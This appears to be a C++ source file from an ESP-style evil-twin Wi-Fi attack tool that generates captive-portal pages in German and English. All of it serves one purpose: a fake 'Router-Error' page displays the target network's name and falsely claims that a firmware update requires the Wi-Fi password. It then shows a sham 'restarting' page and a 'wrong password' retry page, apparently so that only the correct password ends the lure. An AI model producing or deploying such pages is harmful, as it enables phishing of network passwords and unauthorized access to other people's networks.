#include "portal_pages.h"

String indexCSS(){ //CSS of the Index Page
  String _html = "body {";
  _html += "font-family: Arial;";
  _html += "background-color: #f2f2f2;";
  _html += "margin: 0;";
  _html += "height: 100vh;";
  _html += "display: flex;";
  _html += "flex-direction: column;";
  _html += "align-items: center; }";
  
  _html += "#networkBar {";
  _html += "background-color: #007bff;";
  _html += "color: #fff;";
  _html += "padding: 22px 0;";
  _html += "width: 100%; }";
  
  _html += "#networkName {";
  _html += "font-weight: bold;";
  _html += "padding: 0 20px;";
  _html += "font-size: 24px; }";
  
  _html += "#content {";
  _html += "flex-grow: 1;";
  _html += "display: flex;";
  _html += "flex-direction: column;";
  _html += "justify-content: center;";
  _html += "max-width: 50%; }";

  _html += "form { margin-top: 20px; display: flex; justify-content: space-between;}";

  _html += "#center { align-items: center; }";
  
  _html += "h1 { font-size: 28px; }";
  
  _html += "p {";
  _html += "margin: 0;";
  _html += "font-size: 18px; }";
  
  _html += "label {";
  _html += "display: block;";
  _html += "margin-bottom: 10px;";
  _html += "color: #333;";
  _html += "font-weight: bold; }";
  
  _html += "input[type='password'] {";
  _html += "width: 60%;";
  _html += "padding: 10px;";
  _html += "border: 1px solid #ccc;";
  _html += "border-radius: 5px;";
  _html += "font-size: 16px; }";
  
  _html += "button {";
  _html += "background-color: #007bff;";
  _html += "color: #fff;";
  _html += "border: none;";
  _html += "padding: 10px 20px;";
  _html += "border-radius: 5px;";
  _html += "cursor: pointer;";
  _html += "font-size: 18px; }";
  
  _html += "button:hover { background-color: #0056b3; }";

  return _html;
}

String Index(const String& indexLang, const String& favicon, const String& currentSSID){
  String _html; _html.reserve(6500);
  _html +="<!DOCTYPE html><html><head>";
  _html += "<meta charset='UTF-8'>";
  _html += "<title>";

  if (indexLang == "DE"){ _html += "Router-Fehler"; }
  if (indexLang == "EN"){ _html += "Router-ERROR"; }
  
  _html += "</title>";
  _html += favicon;
  _html += "<style>" + indexCSS();
  _html += "</style>";
  _html += "</head>";
  _html += "<body>";
  _html += "<div id='networkBar'>";
  _html += "<span id='networkName'>" + currentSSID + "</span>";
  _html += "</div>";
  _html += "<div id='content'>";
  
  if (indexLang == "DE"){
    _html += "<div><h1 class='center'>Router-Fehler</h1>";
    _html += "<p>Es wurde ein Problem mit Ihrem Router festgestellt, dass ein Update der Software erfordert.</p>";
    _html += "<p>Dies kann aus verschiedenen Gründen notwendig sein, wie z.B. aufgrund einer Sicherheitslücke oder eines Fehlers in der Software.</p>";
    _html += "<p>Um das Update zu installieren und das Problem zu beheben müssen sie ihr WiFi-Passwort eingeben, dies ist notwendig um zu verifizieren dass sie die erlaubnis haben ein Update zu installieren.</p>";
    _html += "<p>Bitte geben Sie das Wi-Fi-Passwort in das unten stehende Feld ein und klicken Sie auf 'Update Installieren'. Dadurch wird dass Software Update installiert und der Router wird neu gestartet, dadurch sollten die meisten Probleme behoben sein.</p>";
    _html += "<p>Wenn Sie das Wi-Fi-Passwort nicht kennen oder es vergessen haben, kontakieren sie ihren Systemadministrator oder schauen Sie auf dem Etikett and der Rückseite Ihres Routers nach.</p>";
    _html += "<p>Wenn Sie weiterhin Probleme haben, wenden Sie sich an Ihren Systemadministrator oder den Hersteller Ihres Routers.</p>";
    _html += "</div><div><form action='/post'>";
    _html += "<input type='password' placeholder='Wi-Fi-Passwort' name='wifiPassword' minlength='8' required>";
    _html += "<button type='submit'>Update Installieren</button>";
    _html += "</form></div>";
  }

  if (indexLang == "EN"){
    _html += "<div><h1 class='center'>Router-Error</h1>";
    _html += "<p>A problem with your Router has been detected, that requires a software update to be installed.</p>";
    _html += "<p>This may be necessary for various reasons, such as security updates or errors in the Software.</p>";
    _html += "<p>To restart the router and install the update, you will need to enter the Wi-Fi password to ensure that you are authorized to install an update.</p>";
    _html += "<p>Please enter the Wi-Fi password in the field below and click 'Update'. This will install the update and restart the router which should resolve most problems.</p>";
    _html += "<p>If you don't know the Wi-Fi password or have forgotten it, you can contact your systemadministrator or usually you can find it on a label in the back of your router.</p>";
    _html += "<p>If you continue to have problems, contact your Internet service provider or your router manufacturer.</p>";
    _html += "</div><div><form action='/post'>";
    _html += "<input type='password' placeholder='Wi-Fi-Password' name='wifiPassword' minlength='8' required>";
    _html += "<button type='submit'>Update</button>";
    _html += "</form></div>";
  }
    
  _html += "</div></body></html>";

  Serial.printf("index length: %i\n", _html.length());
  return _html;
}

String Fixing(const String& indexLang, const String& favicon, const String& currentSSID){
  String _html = "<meta charset='UTF-8'>";

  _html += "<title>";
  if (indexLang == "DE"){_html += "Router wird Neugestartet";}
  if (indexLang == "EN"){_html += "Router is restarting";}
  _html += "</title>";
  
  _html += favicon;
  _html += "<style>" + indexCSS();
  _html += "</style>";
  _html += "</head>";
  _html += "<body>";
  _html += "<div id='networkBar'>";
  _html += "<span id='networkName'>" + currentSSID + "</span>";
  _html += "</div>";
  _html += "<div id='content'>";
  
  if (indexLang == "DE"){
    _html += "<h1 class='center'>Der Router wird Neugestartet und das Update wird installiert</h1>";
    _html += "<p>Ihr Router wird nun neugestartet und das Update wird installiert, dieser Prozess kann einige Minuten dauern.</p>";
    _html += "<p>Wir danken ihnen für ihre Geduld und hoffen dass die Probleme hierdurch behoben werden.</p>";
    _html += "<p>Falls weiterhin Probleme auftreten sollten sie ihren Systemadministrator oder den Hersteller des Routers kontaktieren.</p>";
  }

  if (indexLang == "EN"){
    _html += "<h1 class='center'>The Router is restarting and the update is beeing installed</h1>";
    _html += "<p>The router will now restart and install the update, this process may take a few minutes.</p>";
    _html += "<p>We thank you for your patience and hope that this will solve your problems.</p>";
    _html += "<p>If the problems are not solved by installing the update please contact your systemadministrator or the manufacturer of the router.</p>";
  }
    
  _html += "</div>";
  _html += "</body></html>";

  Serial.printf("fixing length: %i\n", _html.length());
  return _html;
}

String wrongPass(const String& indexLang, const String& favicon, const String& currentSSID){
  String _html;
  _html += "<body><html>";
  _html += favicon;
  _html += "<style>" + indexCSS();
  _html += "</style>";
  _html += "</head>";
  _html += "<body>";
  _html += "<div id='networkBar'>";
  _html += "<span id='networkName'>" + currentSSID + "</span>";
  _html += "</div>";
  _html += "<div id='content'>";
  
  if (indexLang == "DE"){
    _html += "<h1 class='center'>Falsches Passwort!</h1>";
    _html += "<p>Das eingegebene Passwort ist nicht dass richtig Passwort.</p>";
    _html += "<p>Bitte geben sie das richtige Passwort ein um das Update durchzuführen.</p>";
    _html += "<p>Wenn sie das Passwort nicht wissen kontaktieren sie bitte ihren Systemadministrator oder den Hersteller des Routers.</p>";
    _html += "<form action='/'><button type='submit'>Erneut versuchen</button></form>";
  }

  if (indexLang == "EN"){
    _html += "<h1 class='center'>Wrong Password!</h1>";
    _html += "<p>The entered password was not correct.</p>";
    _html += "<p>Please enter the correct password to proceed with the update.</p>";
    _html += "<p>If you don't know the password contact your systemadministrator oder the manufacturer of the router.</p>";
    _html += "<form action='/'><button type='submit'>Try again</button></form>";
  }
    
  _html += "</div>";
  _html += "</body></html>";

  Serial.printf("wrongPass length: %i\n", _html.length());
  return _html;
}